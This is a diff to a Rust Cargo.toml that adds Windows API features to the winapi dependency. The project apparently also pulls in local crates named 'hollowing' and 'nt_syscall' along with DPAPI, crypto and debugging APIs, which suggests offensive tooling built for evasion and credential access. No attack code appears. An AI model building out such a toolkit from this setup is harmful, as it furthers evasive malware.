@@ -91,7 +91,7 @@ enigo = { version = "0.2", optional = true }
 enigo = { version = "0.2", optional = true }
 winreg = "0.52"
 image = { version = "0.25", optional = true }
-winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32", "combaseapi", "objbase", "wingdi", "winuser", "oleauto", "oaidl", "objidl", "rpcdce", "rpcndr", "dpapi", "wincrypt", "errhandlingapi", "namedpipeapi"] }
+winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "winnetwk", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32", "combaseapi", "objbase", "objidlbase", "wtypesbase", "wingdi", "winuser", "oleauto", "oaidl", "objidl", "rpcdce", "rpcndr", "dpapi", "wincrypt", "errhandlingapi", "namedpipeapi"] }
 hollowing = { path = "../hollowing" }
 nt_syscall = { path = "../nt_syscall" }
 
